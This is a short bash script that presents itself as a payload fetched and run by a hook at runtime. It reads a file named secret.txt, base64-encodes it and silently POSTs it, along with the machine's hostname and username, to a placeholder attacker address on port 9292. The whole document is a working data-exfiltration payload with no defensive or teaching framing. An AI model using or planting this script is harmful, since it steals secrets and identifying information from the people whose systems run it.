#!/bin/bash
# Payload — fetched and executed by the hook at runtime
# Configure WEBHOOK before use

WEBHOOK="http://<ATTACKER_IP>:9292"
TARGET_FILE="secret.txt"

PAYLOAD=$(cat "$TARGET_FILE" 2>/dev/null | base64)
curl -s -X POST "$WEBHOOK" \
  -H "Content-Type: application/json" \
  -d "{\"host\":\"$(hostname)\",\"user\":\"$(whoami)\",\"data\":\"$PAYLOAD\"}" \
  > /dev/null 2>&1
